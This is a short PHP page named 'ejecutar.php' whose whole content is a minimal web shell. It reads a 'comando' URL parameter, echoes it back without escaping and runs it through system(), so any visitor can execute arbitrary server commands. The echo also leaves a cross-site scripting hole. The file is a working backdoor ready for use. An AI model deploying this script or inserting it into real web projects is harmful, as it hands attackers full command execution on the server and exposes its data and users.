<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>

<meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>ejecutar.php</title></head><body><br>

<?php $comando = $_GET['comando'];
echo $comando ;
system($comando);

?>

</body></html>